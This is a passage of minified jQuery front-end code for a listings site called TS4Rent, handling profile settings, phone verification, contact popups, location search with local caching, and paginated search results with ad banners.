code"}},(function(){dashActions("confirmPhoneVerification")})):toggleAlert(e.message)};break;case"confirmPhoneVerification":a+="&"+$("#phoneVerificationConfirmForm").serialize(),t=function(e){1==e.success&&(toggleConfirm(),reloadDashboard()),toggleAlert(e.message)};break;default:return}pageLoader("show"),$.ajax({type:"POST",url:"/settings/ajax",cache:!1,data:a,success:function(e){pageLoader("hide");var a=$.parseJSON(e);"function"==typeof t&&t(a)}})}function reloadDashboard(){0!=$("#settingsPage.settings-index").length&&$("#settings-right").unbind("load").load("/settings/ #settings-right > *",(function(e){$("#right").length>0&&$("#right").html($(e).find("#right .overviewBox")),initScripts(),loadChosen()}))}function privateGalleryCodePopup(){toggleConfirm({title:translate("dashboard-privategallerycode"),text:'<div class="txtBold">'+translate("settings-changeyourprivategallerycodehere")+'</div><input type="text" class="input mrgTop2 mrgBot" id="privateGalleryCodeInput" maxlength="16">',buttons:{confirmLabel:translate("settings-savegallerycode")}},(function(){savePrivateGalleryCode()}),(function(){$("#privateGalleryCodeInput").val($(".private-gallery-code-js").text())}))}function getAvailabilityFormPattern(e){availabilityOptionsData=e.options;var t,a="";return $.each(e.options,(function(e,t){a+='<option value="'+e+'">'+t.name+"</option>"})),t=$(window).width()<800,'<form id="setAvailabilityForm" class="bigChosen chosenNoSearch smallChosenDrop txtLeft" onsubmit="return false;"><div><label for="availabilityTime">'+translate("settings-selectavailabilityoption")+'</label><select name="availabilityOption" id="availabilityOption" class="'+(t?"":"chosen")+' input" onchange="availabilityOptions();">'+a+'</select></div><div class="mrgTop2 availabilityTimeContainer invisible"><label for="availabilityTime">'+translate("settings-selectavailabilityperiod")+'</label><select name="availabilityTime" id="availabilityTime" class="'+(t?"":"chosen")+' input"></select></div><div class="mrgTop2 availabilityTweetContainer invisible"></div></form>'}function availabilityOptions(){var e=$("#availabilityOption"),t=$("#availabilityTime"),a=$("#setAvailabilityForm .availabilityTimeContainer"),i=$("#setAvailabilityForm .availabilityTweetContainer"),o=parseInt(e.val());if(a.addClass("invisible"),i.addClass("invisible"),0==o)t.empty().trigger("chosen:updated");else{a.removeClass("invisible"),1==o&&i.removeClass("invisible");var n="";$.each(availabilityOptionsData[o].times,(function(e,t){n+='<option value="'+e+'">'+t+"</option>"})),t.html(n).trigger("chosen:updated")}centerConfirm()}function getPhoneVerificationPattern(e){return'<form id="phoneVerificationForm" action="" method="post" onsubmit="return false;"><div class="glassLayer">Enter your phone number below so we can send you a verification code.</div><div class="clear mrgTop2 bigChosen smallChosenDrop txtLeft"><div class="split2 floatLeft"><div class="clear">Dialing code:</div><select name="phoneCode" class="chosen input"><option value="0">-- Please Select --</option>'+e.dialingCodeOptions+'</select></div><div class="split2 floatLeft"><div class="clear">Phone number:</div><input type="text" value="'+e.phone+'" class="input mrg0" name="phoneNumber" id="verificationPhoneNumber" /></div><div class="clear"></div><div class="mrgTop2 chosenNoSearch"><div class="clear">Choose verification type:</div><select name="verificationType" class="chosen input"><option value="0">-- Please Select --</option><option value="1">By SMS (text message)</option><option value="2">By phone call</option></select></div></div></form>'}function getPhoneVerificationConfirmPattern(){return'<form id="phoneVerificationConfirmForm" action="" method="post" onsubmit="return false;"><div class="mrgBot txtLeft"><div class="glassLayer">'+translate("common-verificationcodewillbesend",{clickhere:'<a href="javascript:void(0);" class="txtBold" onclick="dashActions(\'getPhoneVerificationPopup\');">'+translate("login-clickhere")+"</a>"})+'</div></div><div class="txtLeft">Enter your code below<input type="text" class="input" name="verificationCode" /></div></form>'}function getStatisticSnapshot(){$.ajax({type:"GET",url:"/analytics/ajax",cache:!1,data:{action:"getDashboardData"},success:function(e){var t=$.parseJSON(e);if(1==t.success){var a="";$.each(t.visits,(function(e,t){a+=function(e){return"<tr><td><strong>"+e.day+'</strong></td><td><div class="statsBar"><div class="statsBarInner" style="width: '+e.percent+'%;"></div></div></td><td>'+e.count+"</td></tr>"}(t)})),$("#visitsWeek").html(a),$("#visitsSpan").text(t.totalPageViews),$("#contactSpan").text(t.totalContactClicks)}else $("#visitsWeek").html('<tr><td colspan="3">'+t.message+"</td></tr>"),$("#visitsSpan").text("--"),$("#contactSpan").text("--")}})}function profileActions(e,t){var a="action="+e+"&userID="+t,i=null;switch(e){case"getPhone":i=function(e){toggleAlert(getProfilePhonePattern(e),translate("profile-givemeacallnow"))};break;case"getMap":i=function(e){toggleAlert('<div id="userMap" style="height:350px;"></div>',translate("search-mapme"),(function(){alertWidth(650),mapByGPS({target:"userMap",latitude:e.latitude,longitude:e.longitude})}))};break;case"getLocationInfo":i=function(e){toggleAlert(getProfileLocationInfoPattern(e),translate("common-locationinfo"),(function(){alertWidth(650)}))};break;case"getEmail":i=function(e){if($(window).width()<800){var a=e.isInternal,i=new Date,o='<form id="sendEmailForm" action="" method="post" class="txtLeft">'+(0==a?'<div><div class="txtBold txtWhite mrgBot">'+translate("common-yourname")+':</div><input class="input txt16" type="text" name="senderName" id="senderName" data-theme="rm3" placeholder="'+translate("common-yourname")+'" onkeyup="countChars(this, 30);" onfocus="inputValidStatus(this, 1);" /><div class="inputError"></div><div class="clear"></div></div><div><div class="txtBold txtWhite mrgBot mrgTop2">'+translate("mailbox-youremailaddress")+':</div><input class="input txt16" type="text" name="senderAddress" id="senderAddress" data-theme="rm3" placeholder="'+translate("mailbox-youremailaddress")+'" onfocus="inputValidStatus(this, 1);" /><div class="inputError"></div><div class="clear"></div></div>':"")+'<div class="invisible"><div class="txtBold txtWhite mrgBot mrgTop2">'+translate("mailbox-emailsubject")+':</div><input class="input txt16" type="text" name="emailSubject" id="emailSubject" data-theme="rm3" placeholder="'+translate("mailbox-emailsubject")+'" onkeyup="countChars(this, 45);" onfocus="inputValidStatus(this, 1);" /><div class="inputError"></div><div class="counter">50 '+translate("common-charactersleft")+'</div><div class="clear"></div></div><div><div class="txtBold txtWhite mrgBot mrgTop2">'+translate("mailbox-emailmessage")+':</div><textarea class="input txt16" style="height: 107px;max-height:107px;" name="emailMessage" id="emailMessage" data-theme="rm3" placeholder="'+translate("mailbox-emailmessage")+'..." onkeyup="countChars(this, 2000);" onfocus="inputValidStatus(this, 1);"></textarea><div class="inputError"></div><div class="counter">2000 '+translate("common-charactersleft")+'</div><div class="clear"></div></div><div class="'+(0==a?"mrgTop2":"invisible")+'"><div class="mrgRight2 floatLeft"><img src="/profile/captcha?q='+i.getTime()+'" class="captchaImage mrgTop" style="border:1px solid #333;"/></div><div class="overflowHidden"><input class="input" type="text" name="emailCaptcha" id="emailCaptcha" data-theme="rm3" placeholder="'+translate("common-enterthecode")+'" maxlength="5" onfocus="inputValidStatus(this, 1);" /><div class="inputError"></div></div><div class="clear"></div></div></form><div class="button mrgTop2 blue" onclick="sendEmail('+t+", 'sendEmail');\">"+translate("common-sendemail")+"</div><p class=\"txtRed pointer txtCenter txtUnderline\" onclick=\"$('#mailMeMobile').html('');animateScrollTo('#profilePage');\">"+translate("common-cancel")+"</p>";$("#mailMeMobile").html(o),animateScrollTo("#mailMeMobile")}else{toggleConfirm({title:translate("common-sendemail"),text:getEmailFormPattern(e.isInternal),stay:!0,buttons:{confirmLabel:translate("common-sendemail"),cancelClass:"invisible",confirmClass:"visible pink button mrgRight0"}},(function(){sendEmail(t,"sendEmail",(function(){toggleConfirm()}))}),(function(){confirmWidth(650)}))}}}pageLoader("show"),$.ajax({type:"GET",url:"/profile/ajax",cache:!1,data:a,error:function(){pageLoader("hide")},success:function(e){pageLoader("hide");var t=$.parseJSON(e);0==t.success?toggleAlert(t.message):"function"==typeof i&&i(t)}})}function getProfilePhonePattern(e){return'<div class=""><div class="mrgBot2 mrgTop2">'+(1==e.prebooking_only?'<div class="txt14 txtGray9">Hey, know that '+e.username+" is available for future bookings and online services, but prefers not to meet other people in person at the moment, before you call her!</div>":"")+'<div class="flex flexItemsCenter flexFlowCenter mrgTop5 mrgBot5"><div class="phoneCallIcon"></div><div><div class="phoneCallTitle">'+translate("common-phone")+':</div><div class="phoneCallTxt">+'+e.dialing_code+" "+e.phone+'</div></div></div></div><div class="txtCenter">'+(void 0!==e.stage_name?translate("profile-whencallingmepleaseaskfor")+' <span class="txtBold txtPink">'+e.stage_name+". </span>":"")+translate("profile-saythatyoufoundmyadon",{websitedomain:'<span class="txtWhite">TS4Rent</span>'})+"</div></div>"}function getEmailFormPattern(e){var t=new Date;return'<form id="sendEmailForm" action="" method="post" class="txtLeft">'+(0==e?'<div><div class="txtBold txtWhite mrgBot">'+translate("common-yourname")+':</div><input class="input txt16" type="text" name="senderName" id="senderName" data-theme="rm3" placeholder="'+translate("common-yourname")+'" onkeyup="countChars(this, 30);" onfocus="inputValidStatus(this, 1);" /><div class="inputError"></div><div class="clear"></div></div><div><div class="txtBold txtWhite mrgBot mrgTop2">'+translate("mailbox-youremailaddress")+':</div><input class="input txt16" type="text" name="senderAddress" id="senderAddress" data-theme="rm3" placeholder="'+translate("mailbox-youremailaddress")+'" onfocus="inputValidStatus(this, 1);" /><div class="inputError"></div><div class="clear"></div></div>':"")+'<div class="invisible"><div class="txtBold txtWhite mrgBot mrgTop2">'+translate("mailbox-emailsubject")+':</div><input class="input txt16" type="text" name="emailSubject" id="emailSubject" data-theme="rm3" placeholder="'+translate("mailbox-emailsubject")+'" onkeyup="countChars(this, 45);" onfocus="inputValidStatus(this, 1);" /><div class="inputError"></div><div class="counter">50 '+translate("common-charactersleft")+'</div><div class="clear"></div></div><div><div class="txtBold txtWhite mrgBot mrgTop2">'+translate("mailbox-emailmessage")+':</div><textarea class="input txt16" style="height: 107px;max-height:107px;" name="emailMessage" id="emailMessage" data-theme="rm3" placeholder="'+translate("mailbox-emailmessage")+'..." onkeyup="countChars(this, 2000);" onfocus="inputValidStatus(this, 1);"></textarea><div class="inputError"></div><div class="counter">2000 '+translate("common-charactersleft")+'</div><div class="clear"></div></div><div class="'+(0==e?"mrgTop2":"invisible")+'"><div class="mrgRight2 floatLeft"><img src="/profile/captcha?q='+t.getTime()+'" class="captchaImage mrgTop" style="border:1px solid #333;"/></div><div class="overflowHidden"><input class="input" type="text" name="emailCaptcha" id="emailCaptcha" data-theme="rm3" placeholder="'+translate("common-enterthecode")+'" maxlength="5" onfocus="inputValidStatus(this, 1);" /><div class="inputError"></div></div><div class="clear"></div></div></form>'}function sendEmail(e,t,a){if(void 0!==e&&void 0!==t){var i="action="+t+"&userID="+e+"&"+$("#sendEmailForm").serialize();pageLoader("show"),$.ajax({type:"POST",url:"/profile/ajax",cache:!1,data:i,success:function(e){pageLoader("hide");var t=$.parseJSON(e);0==t.success?(validateInfo(t.elements),reloadImage($("#sendEmailForm .captchaImage"))):"function"==typeof a&&a(),toggleAlert(t.message)}})}}function getProfileLocationInfoPattern(e){return'<div class="clear" style="background: url(/public/images/mapme.jpg) top left repeat;"><div style="text-align: left; padding: 10px;"><strong class="block txt16"><span class="locicon-home"></span>'+translate("common-homelocation")+": "+e.home.location+'</strong><span class="block mrgBot3 txtBlack">'+translate("common-thisisusernamehomelocation",{username:e.username})+"</span>"+(e.gps.user.has_gps?'<strong class="block txt16"><span class="locicon-gps"></span>'+translate("common-gpslocation")+": "+e.gps.user.location+'</strong><span class="block mrgBot3 txtBlack">'+translate("common-thisisusernamelatestgpslocation",{username:e.username})+" "+e.gps.user.last_shared+"</span>"+(e.gps.visitor.has_gps?'<strong class="block txt16"><span class="locicon-distance"></span>'+translate("common-distance")+": "+e.gps.distance.display+'</strong><span class="block mrgBot3 txtBlack">'+translate("profile-thisisthedistancebetween",{username:e.username})+"</span>":'<strong class="block txt16"><span class="locicon-distance"></span>'+translate("common-distance")+': N/A</strong><span class="block mrgBot3 txtBlack">'+translate("common-distancecouldnotbedetermined")+' <a href="javascript:void(0);" onclick="progileShareGPS();">'+translate("common-sharemygpslocation")+"</a></span>"):'<strong class="block txt16"><span class="locicon-gps"></span>'+translate("common-gpslocation")+": "+translate("profile-notsharedyet")+".</strong>")+"</div></div>"}function profileShareGPS(){getGeolocation({successCallback:function(e){window.location.reload()}})}function searchLocations(e){pageLoader("show");var t="action=searchLocation&locID=",a=0;void 0===e&&(e={}),void 0!==e.locationID&&(a=e.locationID),t+=a;var i=getLocalStorage("locations");if(null!=i){var o=JSON.parse(i);o.searchfor=a,setLocalStorage("locations",JSON.stringify(o))}$.ajax({type:"GET",url:"/search/ajax",cache:!1,data:t,success:function(t){pageLoader("hide");var a=$.parseJSON(t);0==a.success?toggleAlert(a.message):"function"==typeof e.callback?e.callback(a):window.location=a.searchPage}})}function setLocalStorage(e,t){if(void 0!==window.localStorage)try{return window.localStorage.setItem(e,t)}catch(e){window.localStorage.clear()}return null}function getLocalStorage(e){return void 0!==window.localStorage?window.localStorage.getItem(e):null}function getLocalStorageCache(e){var t=Math.round((new Date).getTime()/1e3),a=parseInt(getLocalStorage(e+"Time"));return a&&a>t?getLocalStorage(e):null}function setLocalStorageCache(e,t,a){return setLocalStorage(e+"Time",Math.round((new Date).getTime()/1e3)+a),setLocalStorage(e,t)}function deleteLocalStorage(e){return void 0!==window.localStorage?window.localStorage.removeItem(e):null}function clearLocalStorage(){return void 0!==window.localStorage?window.localStorage.clear():null}var locationsObj={};function loadTopLocations(){var e=function(e){var t=$.parseJSON(e),a=translate("common-alllocations");locationsObj.all=t.locations,locationsObj.country={};var i=$(".naviconcontainer.mailbox");t.newEmails>0?(i.find(".mails-counter").removeClass("invisible"),i.find(".mails-counter").text(t.newEmails)):i.find(".mails-counter").addClass("invisible"),$.each(locationsObj.all,(function(e,i){locationsObj.all[e].search_string=" "+i.city+" "+i.state+" "+i.country+" "+i.country_short+" "+i.keywords,i.location_id==t.searchfor&&(a="US"==i.country_short||"CA"==i.country_short?i.state+" - "+i.city:i.country+" - "+i.city),i.country_short==t.country&&(locationsObj.country[e]=i)})),$("#top-location").val(t.searchfor),$("#top-location-submit").unbind().on("click",(function(){selectAutocompleteLocation(),$("#locationPopUp").text(a)})),$("#locationPopUp").text(a);var o,n=$("#locationsAutocompleteInput");n.attr("placeholder",a),n.unbind().on("click keyup",(function(){n.focus(),searchAutocompleteLocations()})),$("#locationForm").unbind().on("mouseleave",(function(){o=setTimeout((function(){$("#locationsAutocompleteContainer").addClass("invisible")}),500)})).on("mouseenter",(function(){void 0!==o&&clearTimeout(o)})),$("#homePage").length>0&&showGeolocationPopup()},t=Math.round((new Date).getTime()/1e3),a=parseInt(getLocalStorage("locationsTime"));if(a&&a+43200>t){var i=getLocalStorage("locations");if(null!=i)return void e(i)}setLocalStorage("locationsTime",t),$.ajax({type:"GET",url:"/ajax/toplocations",cache:!0,data:"",success:function(t){e(t),setLocalStorage("locations",t)}})}function searchAutocompleteLocations(){if(void 0===locationsObj)return!1;var e="",t=$("#locationsAutocompleteContainer"),a=$("#locationsAutocompleteInput").val(),i=a.length;if(i>0){var o=new RegExp(escapeRegex(" "+a),"i");$.each(locationsObj.all,(function(t,a){o.test(a.search_string)&&("US"==a.country_short||"CA"==a.country_short?e+='<li class="pointer" data-locid="'+a.location_id+'">'+a.state+" - "+a.city+"</li>":e+='<li class="pointer" data-locid="'+a.location_id+'">'+a.country+" - "+a.city+"</li>")}))}else $.each(locationsObj.all,(function(t,a){"US"==a.country_short||"CA"==a.country_short?e+='<li class="pointer" data-locid="'+a.location_id+'">'+a.state+" - "+a.city+"</li>":e+='<li class="pointer" data-locid="'+a.location_id+'">'+a.country+" - "+a.city+"</li>"}));var n='<ul class="cleanlist"><li class="pointer" data-locid="0"><div class="txtCenter">&mdash; '+translate("search-searchinalllocations")+" &mdash;</div></li></ul>";t.html('<ul class="cleanlist scroll-list">'+e+"</ul>"+n).removeClass("invisible").find("li").on("click",(function(e){e.preventDefault(),e.stopPropagation(),selectAutocompleteLocation(parseInt($(this).attr("data-locid")))}))}function selectAutocompleteLocation(e){void 0===e?$("#locationsAutocompleteInput").val().length>0?$("#locationsAutocompleteContainer").find("li").first().click():searchLocations({locationID:$("#top-location").val()}):searchLocations({locationID:e})}var profileGallery={public:{},private:{}};function profileSectionToggle(){$.each($(".profileSectionContent"),(function(e){$(this).outerHeight()>216&&$(this).parent().parent().addClass("show")}))}function initScripts(){$(".mobileNav").mouseenter((function(){$(this).mouseleave((function(){$(this).fadeOut()}))})),$("#profilePage").length>0?(loadFancyBox(),loadPhotoSwipe(".photoSwipe"),loadPhotoSwipe(".photoSwipeP"),$("#media-public .media-thumb").length>0&&$("#media-public .media-thumb").first().click()):$("#settingsPage.settings-whosawme").length>0||$("#settingsPage.settings-whodidisee").length>0?$(".visits-js").hide():$("#paymentsPage").length>0?$("#payment-ex").addClass("invisible"):$("#settingsPage.settings-verification").length>0&&$("#userStatusAlertContainer").hide(),$(".sponsors-aside-js").length>0&&(setInterval((function(){homeSpecialAdsSlider(".abr-js-ads")}),7e3),$(".spsContainer-js").find(".slide-js-ad").css({width:$(".spsContainer-js").width()})),$(".sponsors-aside-mobile-js").length>0&&(setInterval((function(){rotateSponsorsMobile(".abr-js-mobile-ads")}),7e3),$(".spsContainer-mobile-js").find(".slide-js-mobile-ad").css({width:$(".spsContainer-mobile-js").width()}))}var keeponlineInterval,pendingAnswers=0;function getInterviewQuestions(){var e=$("#answeredQuestions"),t=$("#pendingQuestions");pageLoader("show"),$.ajax({type:"GET",url:"/interviews/ajax",cache:!1,data:"action=myInterviewData",success:function(a){pageLoader("hide");var i=$.parseJSON(a);if(1==i.success){var o="",n="";$("#pendingCounter").text(i.counter.pending),$("#answeredCounter").text(i.counter.answered),$("#interviewProgressBar").text(i.counter.percent+"%"),$("#interviewProgressBarPercent").css("width",i.counter.percent+"%"),pendingAnswers=i.counter.pending,i.counter.answered>3&&$(".featureinterview-show-js").removeClass("invisible"),$.each(i.pending.data,(function(e,t){o+=interviewQuestionPattern(t)})),t.html(o),$.each(i.answered.data,(function(e,t){n+=interviewQuestionPattern(t,1)})),e.html(n)}else t.html('<div class="alertBox light blue">'+i.message+"</div>");0==i.counter.pending&&$(".completed-interview-js").removeClass("invisible")}})}function interviewQuestionPattern(e,t){var a,i;return void 0!==e.answer?(a=e.answer,e.answer,i=$("<p>"+e.answer+"</p>").text()):(a=translate("common-clickheretoanswer"),"",i=""),'<div id="questionBox_'+e.question_id+'" class="mrgBot2"><div class="right mrgLeft2"><div onclick="interviewActions(\'editAnswer\', '+e.question_id+');" class="interviewAction mrgBot pointer"><span title="'+translate("common-addananswer")+'" class="interviewEditIcon"></span></div></div><div class="overflowHidden"><div style="min-height: 0px;" class="stream-bubble"><span class="stream-bubble-arrow"></span><div class="content"><p class="mrgTop0 txtGrayC">'+e.question+"</p><p onclick=\"interviewActions('editAnswer', "+e.question_id+');" class="txtWhite notAnswered pointer txtBold">'+a+'</p><div class="overflowHidden interviewEditContainer'+e.question_id+' none"><textarea id="answer_'+e.question_id+'" onkeyup="countChars(this, 1200);" rows="5" class="input">'+i+'</textarea><small class="counter right"></small><div class="clear mrgTop2"><div href="javascript:void(0);" class="button pink small left" onclick="interviewActions(\'updateAnswer\', '+e.question_id+');">'+translate("common-save")+'</div><div href="javascript:void(0);" class="button mrgLeft2 small left" onclick="getInterviewQuestions();">'+translate("common-cancel")+"</div></div></div></div></div></div></div>"}function interviewActions(e,t){var a="",i=null;switch(e){case"editAnswer":var o=$("#questionBox_"+t);return o.find(".answered").addClass("none"),o.find(".notAnswered").addClass("none"),void $(".interviewEditContainer"+t).removeClass("none");case"updateAnswer":i=function(e){1==e.success?getInterviewQuestions():toggleAlert(e.message)},a="action=updateAnswer&questionID="+t+"&answer="+encodeURIComponent($("#answer_"+t).val());break;case"deleteAnswerConfirm":return void toggleConfirm({text:"Do you really want to delete this answer ?",buttons:{confirmLabel:"Delete"}},(function(){interviewActions("deleteAnswer",t)}));case"deleteAnswer":i=function(e){1==e.success?getInterviewQuestions():toggleAlert(e.message)},a="action=updateAnswer&questionID="+t;break;default:return}pageLoader("show"),$.ajax({type:"POST",url:"/interviews/ajax",cache:!1,data:a,error:function(){pageLoader("hide")},success:function(e){pageLoader("hide");var t=$.parseJSON(e);"function"==typeof i&&i(t)}})}var searchUsersXHR,keeponlineSpins=0;function keeponline(){var e=function(e){var t=$.parseJSON(e);if(0==t.success)return void 0!==keeponlineInterval&&clearInterval(keeponlineInterval),void toggleConfirm({title:"Plase Login",text:t.message,buttons:{confirmLabel:"Go To Login"}},(function(){window.location="/login"}));if(void 0===t.deleted||1!=t.deleted)if(keeponlineSpins>30)clearInterval(keeponlineInterval);else{var a=$(".naviconcontainer.settings");if(t.newEmails>0){$(".mails-counter").removeClass("invisible"),$(".mails-counter-mobile-js").removeClass("invisible"),$(".mails-counter").text(t.newEmails),$(".mails-counter-mobile-js").text(t.newEmails);var i=Math.round((new Date).getTime()/1e3),o=parseInt(getLocalStorage("newMailsTime")),n=!0;if(o&&o+86400>i?n=!1:setLocalStorage("newMailsTime",i),n)toggleConfirm({title:"TS4Rent",text:"You have unread messages in your inbox",buttons:{confirmLabel:"Read",cancelLabel:translate("common-cancel")}},(function(){window.location="/mailbox/"}))}else $(".mails-counter").addClass("invisible"),$(".mails-counter-mobile-js").addClass("invisible");t.newVisits>0?(a.find(".nav-notification").text(t.newVisits),a.addClass("active")):a.removeClass("active"),"undefined"!=typeof notificationSound&&1==t.playSound&&(notificationSound.currentTime=0,notificationSound.play()),keeponlineSpins++}else window.location="/profile/logout/"},t=Math.round((new Date).getTime()/1e3),a=parseInt(getCookie("koTime")),i=getCookie("koResult");a&&a+59>t?i&&e(i):(setCookie("koTime",t),$.ajax({type:"GET",url:"/ajax/keeponline",cache:!1,data:{},success:function(t){try{$.parseJSON(t),setCookie("koResult",t),e(t)}catch(e){}}}))}function pageLoader(e,t){if(0==$("#pageLoader").length){$("body").append('<div id="pageLoader" class="invisible"><div class="dimmer"></div><div class="imgContainer"><div class="loaderText"></div></div></div>')}"show"==e&&$("#pageLoader").removeClass("invisible"),"hide"==e&&$("#pageLoader").addClass("invisible"),void 0===t?$("#pageLoader .loaderText").html("Please Wait!"):$("#pageLoader .loaderText").html(t)}function menuNavbar(){var e=$("#header"),t=$("#nav"),a=$(".header-row"),i=$(".headerHeight"),o=e.outerHeight()-t.outerHeight(),n=$(window),s=function(n){if($(window).width()>600)if(n.scrollTop()>o){if(t.hasClass("active"))return;e.css({height:"41px"}),t.addClass("active"),a.css({display:"none"}),i.css({height:"41px"})}else e.css({height:"96px"}),t.removeClass("active"),a.css({display:"block"}),i.css({height:"96px"})};n.unbind().scroll((function(){s(n)})),s(n)}var searchUsersPage=1,searchView="grid";function searchUsers(e,t){void 0===e&&(e=1),e<1&&(e=1),$(window).width()<1024&&(searchView="grid"),searchUsersPage=e,pageLoader("show"),e>1&&bindPushState(window.location.pathname+"?page="+e,{searchPage:e-1},(function(e){searchUsers(e.searchPage,1)})),replaceHistoryURL(window.location.protocol+"//"+window.location.host+window.location.pathname+"?page="+e+"&"+$("#searchForm").serialize()),"object"==typeof searchUsersXHR&&(searchUsersXHR.abort(),searchUsersXHR=null);var a=$("#searchResults"),i="action=getUsers&page="+e+"&"+$("#searchForm").serialize();searchUsersXHR=$.ajax({type:"GET",url:"/search/ajax",cache:!1,data:i,success:function(e){pageLoader("hide");var i=$.parseJSON(e),o="";console.log(i.searchPageBanners),$.each(i.users,(function(e,t){o+=searchUsersPattern(t),7==e&&void 0!==i.cams&&"grid"==searchView&&(o+='<li class="searchLiveCamBox"><div class="profileBox"><div class="photo-big-tall"><div class="profileBox-info"><a href="'+i.cams[0].link+'>" class="txtWhite"><div class="txtUppercase txtBold mrgLeft2 mrgBot2">'+i.cams[0].name+'</div></a></div><a class="full-width block lazyImageContainer" href="'+i.cams[0].link+'" target="_blank"><div class="live-label right">LIVE</div><img class="lazyImage" src="'+i.cams[0].photo+'" /></a></div><div class="profileBox-desc-featured"><div class="profile-desc-pad">'+i.cams[0].name+" is now live</div></div></div></li>",o+='<li class="searchLiveCamBox"><div class="profileBox"><div class="photo-big-tall"><div class="profileBox-info"><a href="'+i.cams[1].link+'>" class="txtWhite"><div class="txtUppercase txtBold mrgLeft2 mrgBot2">'+i.cams[1].name+'</div></a></div><a class="full-width block lazyImageContainer" href="'+i.cams[1].link+'" target="_blank"><div class="live-label right">LIVE</div><img class="lazyImage" src="'+i.cams[1].photo+'" /></a></div><div class="profileBox-desc-featured"><div class="profile-desc-pad">'+i.cams[1].name+" is now live</div></div></div></li>"),2==e&&"list"==searchView&&void 0!==i.cams&&(o+='<li class="clear"><a href="'+i.cams[0].link+'" target="_blank"class="floatLeft split3 relative block"><span class="live-label right">LIVE</span><span class="block searchCamsPhotoContainer" style="background-image: url('+i.cams[0].photo+');"></span><span class="pad txtWhite searchCamsContent"><span class="txtCenter txtBold txtEllipsis block txtWhite mrgBot txtCapitalize">'+i.cams[0].name+'</span></span></a><a href="'+i.cams[1].link+'" target="_blank" class="floatLeft split3 relative block"><span class="live-label right">LIVE</span><span class="block searchCamsPhotoContainer"  style="background-image: url('+i.cams[1].photo+');"></span><span class="pad txtWhite searchCamsContent"><span class="txtCenter txtBold txtEllipsis block txtWhite mrgBot txtCapitalize">'+i.cams[1].name+'</span></span></a><a href="'+i.cams[2].link+'" target="_blank" class="floatLeft split3 relative block"><span class="live-label right">LIVE</span><span class="block searchCamsPhotoContainer"  style="background-image: url('+i.cams[2].photo+');"></span><span class="pad txtWhite searchCamsContent"><span class="txtCenter txtBold txtEllipsis block txtWhite mrgBot txtCapitalize">'+i.cams[2].name+"</span></span></a></li>"),5==e&&"list"==searchView&&void 0!==i.advertiseSearchBanners&&i.searchPageBanners.banners.length<4&&(o+='<li class="clear"><a href="'+i.advertiseSearchBanners.link+'" '+(1==i.advertiseSearchBanners.target_blank?'target="_blank"':"")+' class="mrgTop3 mrgBot3 block"><img src="'+i.advertiseSearchBanners.img+'" style="width: 100%;"></a></li>'),"grid"==searchView&&5==e&&$(window).width()<1024&&void 0!==i.searchPageBanners.banners[3]&&i.searchPageBanners.banners.length>3&&(o+='<li class="clear" style="width: 100%;"><a href="'+i.searchPageBanners.banners[3].link+'" class="mrgTop3 mrgBot3 block"><img style="width: 100%;" src="'+i.searchPageBanners.banners[3].photo_mobile+'"></a></li>'),"list"==searchView&&5==e&&void 0!==i.searchPageBanners.banners[3]&&i.searchPageBanners.banners.length>3&&(o+='<li class="clear" style="width: 100%;"><a href="'+i.searchPageBanners.banners[3].link+'" class="mrgTop3 mrgBot3 block"><img style="width: 100%;" src="'+i.searchPageBanners.banners[3].photo+'"></a></li>'),11==e&&void 0!==i.searchPageBanners.banners[0]&&"list"==searchView&&(o+='<li class="clear"><a href="'+i.searchPageBanners.banners[0].link+'" class="mrgTop3 mrgBot3 block"><img src="'+i.searchPageBanners.banners[0].photo+'" style="width: 100%;"></a></li>'),17==e&&void 0!==i.searchPageBanners.banners[1]&&"list"==searchView&&(o+='<li class="clear"><a href="'+i.searchPageBanners.banners[1].link+'" class="mrgTop3 mrgBot3 block"><img src="'+i.searchPageBanners.banners[1].photo+'" style="width: 100%;"></a></li>'),e==i.users.length-1&&void 0!==i.searchPageBanners.banners[2]&&"list"==searchView&&(o+='<li class="clear"><a href="'+i.searchPageBanners.banners[2].link+'" class="mrgTop3 mrgBot3 block"><img src="'+i.searchPageBanners.banners[2].photo+'" style="width: 100%;"></a></li>'),"grid"==searchView&&11==e&&$(window).width()<1024&&void 0!==i.searchPageBanners.banners[0]&&(o+='<li class="clear" style="width: 100%;"><a href="'+i.searchPageBanners.banners[0].link+'" class="mrgTop3 mrgBot3 block"><img style="width: 100%;" src="'+i.searchPageBanners.banners[0].photo_mobile+'"></a></li>'),"grid"==searchView&&17==e&&$(window).width()<1024&&void 0!==i.searchPageBanners.banners[1]&&(o+='<li class="clear" style="width: 100%;"><a href="'+i.searchPageBanners.banners[1].link+'" class="mrgTop3 mrgBot3 block"><img style="width: 100%;" src="'+i.searchPageBanners.banners[1].photo_mobile+'"></a></li>'),"grid"==searchView&&e==i.users.length-1&&$(window).width()<1024&&void 0!==i.searchPageBanners.banners[2]&&(o+='<li class="clear" style="width: 100%;"><a href="'+i.searchPageBanners.banners[2].link+'" class="mrgTop3 mrgBot3 block"><img style="width: 100%;" src="'+i.searchPageBanners.banners[2].photo_mobile+'"></a></li>'),"grid"==searchView&&5==e&&$(window).width()<1024&&void 0!==i.advertiseSearchBanners&&(o+='<li class="clear" style="width: 100%;"><a href="'+i.advertiseSearchBanners.link+'" '+(1==i.advertiseSearchBanners.target_blank?'target="_blank"':"")+' class="mrgTop3 mrgBot3 block"><img style="width: 100%;" src="'+i.advertiseSearchBanners.img_mobile+'"></a></li>')})),"list"==searchView?a.removeClass("profiles available").addClass("profiles-list"):a.removeClass("profiles-list").addClass("profiles available"),a.html(o),0==i.success&&"undefined"!=i.totalUsers&&0==i.totalUsers&&$("#searchResultStats").html(i.message),0==i.success&&"undefined"!=i.totalUsers&&0==i.totalUsers&&$("#searchResults").html('<div class="txtCenter box txtWhite pointer" id="results" onclick="resetSearch();">'+translate("search-sorrynoresultsfound")+"</div>"),$("#resultsFoundCounter").text(i.totalUsers>1e3?"1000+":i.totalUsers),setPagination({container:"#paginationContainer",page:i.page,next:i.nextPage,prev:i.prevPage,totalPages:i.totalPages,buttons:{nextCallback:function(e){searchUsers(e,!0)},prevCallback:function(e){searchUsers(e,!0)}},pageSelect:{callback:function(e){searchUsers(e,!0)}}}),void 0!==t&&animateScrollTo("#searchResults"),"function"==typeof twitterBoxSize&&twitterBoxSize()}})}function searchUsersPattern(e){var t="";t=1==e.is_available?'<div class="profilesStatus online mrgTop2"><span class="left">'+translate("common-availablenow")+'</span><div class="overflowHidden"></div></div>':2==e.is_available?'<div class="profilesStatus notavailable mrgTop2"><span class="left">'+translate("common-notavailable")+'</span><div class="overflowHidden"></div></div>':1==e.is_online?'<div class="profilesStatus online 